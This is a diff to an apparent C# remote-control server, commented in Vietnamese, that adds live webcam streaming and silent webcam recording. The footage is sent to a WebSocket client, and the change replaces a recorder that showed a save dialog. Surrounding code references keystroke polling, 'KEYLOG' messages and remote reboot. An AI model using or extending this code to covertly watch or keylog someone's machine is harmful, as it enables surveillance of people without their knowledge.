@@ -39,6 +39,21 @@ namespace Server
         // If bạn muốn nhiều client, đổi thành List<WebSocket>
         static WebSocket currentWs = null;
         static CancellationTokenSource streamingCts = null;
+        static WebcamForm webcamForm = null;
+        enum StreamMode{Screen,Webcam}
+        static StreamMode currentStreamMode = StreamMode.Screen;
+        static VideoCaptureDevice webcam;
+        static Bitmap lastWebcamFrame;
+        static object webcamLock = new object();
+        static bool isRecordingWebcam = false;
+        static VideoFileWriter recWriter;
+        static DateTime recStartTime;
+        static string recPath;
+        static Stopwatch recWatch = new Stopwatch();
+
+        static bool recStarted = false;
+        static TimeSpan recDuration = TimeSpan.Zero;
+        static int recTargetSeconds = 0;
 
         // P/Invoke
         [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
@@ -239,25 +254,10 @@ namespace Server
                 }
                 else if (msg == "WEBCAM_START")
                 {
-                    // Call RecVid (this shows a SaveFileDialog on server)
-                    string result = RecVid(10);
-                    if (result.StartsWith("LOG: Video đã lưu tại "))
-                    {
-                        string path = result.Substring("LOG: Video đã lưu tại ".Length).Trim();
-                        if (File.Exists(path))
-                        {
-                            byte[] bytes = File.ReadAllBytes(path);
-                            string b64 = Convert.ToBase64String(bytes);
-                            await SendText(ws, "VID|" + b64);
-                            try { File.Delete(path); } catch { }
-                        }
-                        else await SendText(ws, "KEYLOG|Lỗi: File không tồn tại");
-                    }
-                    else
-                    {
-                        await SendText(ws, result);
-                    }
+                    await SendText(ws, "SYS|REC_START");
+                    _ = StartWebcamRec(11, ws); // quay 10s, không block
                 }
+
                 else if (msg == "STOP_STREAM")
                 {
                     isStreaming = false;
@@ -320,6 +320,18 @@ namespace Server
                     Process.Start("shutdown", "/r /t 0");
                     await SendText(ws, "LOG: Đang khởi động lại...");
                 }
+                else if (msg == "STREAM_WEBCAM")
+                {
+                    currentStreamMode = StreamMode.Webcam;
+                    await SendText(ws, "SYS|STREAM_WEBCAM");
+                }
+                else if (msg == "STREAM_SCREEN")
+                {
+                    currentStreamMode = StreamMode.Screen;
+                    await SendText(ws, "SYS|STREAM_SCREEN");
+                }
+
+
                 else
                 {
                     // unknown command
@@ -351,11 +363,21 @@ namespace Server
                 {
                     if (isStreaming)
                     {
-                        // Đang bật stream → gửi hình thật
-                        byte[] img = CaptureScreenBytes();
-                        string base64 = Convert.ToBase64String(img);
-                        await SendText(ws, "LIVE|" + base64);
+                        byte[] img;
+
+                        if (currentStreamMode == StreamMode.Screen)
+                        {
+                            img = CaptureScreenBytes();
+                        }
+                        else
+                        {
+                            img = CaptureWebcamBytes();
+                        }
+
+                        await SendText(ws, "LIVE|" + Convert.ToBase64String(img));
+
                     }
+
                     else
                     {
                         // gửi khung đen mỗi ~300ms để xóa hình cũ
@@ -501,131 +523,107 @@ namespace Server
             t.Start();
         }
 
-        // RecVid - giữ nguyên (lưu ý: hiện SaveFileDialog)
-        public static string RecVid(int seconds)
+        public static async Task StartWebcamRec(int seconds, WebSocket ws)
         {
-            VideoCaptureDevice videoSource = null;
-            VideoFileWriter writer = null;
-            bool recording = false;
-            bool opened = false;
-            string base64Result = "";
+            InitWebcam();
 
-            try
+            recTargetSeconds = seconds;
+            recPath = Path.Combine(Path.GetTempPath(), $"rec_{DateTime.Now.Ticks}.avi");
+            recWriter = new VideoFileWriter();
+
+            isRecordingWebcam = true;
+
+            // đợi đến khi rec tự stop
+            while (isRecordingWebcam)
+                await Task.Delay(50);
+
+            recWriter.Close();
+            recWriter.Dispose();
+
+            byte[] bytes = File.ReadAllBytes(recPath);
+            await SendText(ws, "VID|" + Convert.ToBase64String(bytes));
+            File.Delete(recPath);
+        }
+        static void InitWebcam()
+        {
+            if (webcam != null && webcam.IsRunning)
+                return;
+
+            var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+            if (devices.Count == 0)
+                throw new Exception("Không tìm thấy webcam");
+
+            webcam = new VideoCaptureDevice(devices[0].MonikerString);
+
+            webcam.NewFrame += (s, e) =>
             {
-                // Lấy webcam đầu tiên
-                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                if (devices.Count == 0)
-                    return "LOG: Không tìm thấy webcam!";
+                Bitmap frame = (Bitmap)e.Frame.Clone();
 
-                videoSource = new VideoCaptureDevice(devices[0].MonikerString);
-
-                // Chọn độ phân giải tốt nhất
-                VideoCapabilities best = videoSource.VideoCapabilities
-                    .OrderByDescending(v => v.FrameSize.Width * v.FrameSize.Height)
-                    .First();
-                videoSource.VideoResolution = best;
-
-                writer = new VideoFileWriter();
-                recording = true;
-
-                // Temp file lưu video
-                string savePath = Path.Combine(Path.GetTempPath(), "rec_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi");
-
-                DateTime startTime = DateTime.Now;
-
-                // Event handler
-                videoSource.NewFrame += (s, e) =>
+                lock (webcamLock)
                 {
-                    if (!recording) return;
+                    lastWebcamFrame?.Dispose();
+                    lastWebcamFrame = (Bitmap)frame.Clone();
+                }
 
-                    Bitmap frame = (Bitmap)e.Frame.Clone();
-
-                    if (!opened)
-                    {
-                        int w = frame.Width; int h = frame.Height;
-                        if (w % 2 != 0) w--; if (h % 2 != 0) h--; // frame size chẵn
-                        writer.Open(savePath, w, h, 30, VideoCodec.MPEG4);
-                        opened = true;
-                    }
-
+                // ghi video nếu đang REC
+                if (isRecordingWebcam && recWriter != null)
+                {
                     try
                     {
-                        var timestamp = DateTime.Now - startTime;
-                        writer.WriteVideoFrame(frame, timestamp);
+                        if (!recWriter.IsOpen)
+                        {
+                            int w = frame.Width;
+                            int h = frame.Height;
+                            if (w % 2 != 0) w--;
+                            if (h % 2 != 0) h--;
+
+                            recWriter.Open(recPath, w, h, 30, VideoCodec.MPEG4);
+                            recWatch.Restart();
+                            recStarted = false;
+                        }
+
+                        // FRAME ĐẦU → BẮT ĐẦU TÍNH GIỜ
+                        if (!recStarted)
+                        {
+                            recStarted = true;
+                            recWatch.Restart();
+                        }
+
+                        recDuration = recWatch.Elapsed;
+
+                        if (recDuration <= TimeSpan.FromSeconds(recTargetSeconds))
+                        {
+                            recWriter.WriteVideoFrame(frame, recDuration);
+                        }
+                        else
+                        {
+                            isRecordingWebcam = false;
+                        }
                     }
-                    catch
-                    {
-                        // ignore encoding error
-                    }
-                    finally
-                    {
-                        frame.Dispose();
-                    }
-                };
-
-                videoSource.Start();
-
-                Thread.Sleep(seconds * 1000); // quay xong
-
-                recording = false;
-                videoSource.SignalToStop();
-                videoSource.WaitForStop();
-
-                if (opened)
-                {
-                    writer.Close();
-                    writer.Dispose();
+                    catch { }
                 }
 
-                // Convert video thành base64
-                if (File.Exists(savePath))
-                {
-                    byte[] bytes = File.ReadAllBytes(savePath);
-                    base64Result = Convert.ToBase64String(bytes);
-                    try { File.Delete(savePath); } catch { }
-                }
 
-                return "VID|" + base64Result;
-            }
-            catch (Exception ex)
-            {
-                return "LOG: Lỗi quay webcam: " + ex.Message;
-            }
-            finally
-            {
-                try { videoSource?.SignalToStop(); videoSource?.WaitForStop(); } catch { }
-                try { writer?.Close(); writer?.Dispose(); } catch { }
-                videoSource = null;
-                writer = null;
-                GC.Collect();
-                GC.WaitForPendingFinalizers();
-            }
+                frame.Dispose();
+            };
+
+            webcam.Start();
         }
 
-        public async Task DisconnectServer()
+        static byte[] CaptureWebcamBytes()
         {
-            try
+            InitWebcam();
+
+            lock (webcamLock)
             {
-                if (globalWS != null)
+                if (lastWebcamFrame == null)
+                    return CreateBlackJpeg();
+
+                using (MemoryStream ms = new MemoryStream())
                 {
-                    if (globalWS.State == WebSocketState.Open)
-                    {
-                        await globalWS.CloseAsync(
-                            WebSocketCloseStatus.NormalClosure,
-                            "Client disconnect",
-                            CancellationToken.None
-                        );
-                    }
-
-                    globalWS.Dispose();
-                    globalWS = null;
+                    lastWebcamFrame.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                    return ms.ToArray();
                 }
-
-                Console.WriteLine("LOG: Đã ngắt kết nối server!");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("LOG: Lỗi khi ngắt kết nối: " + ex.Message);
             }
         }
 
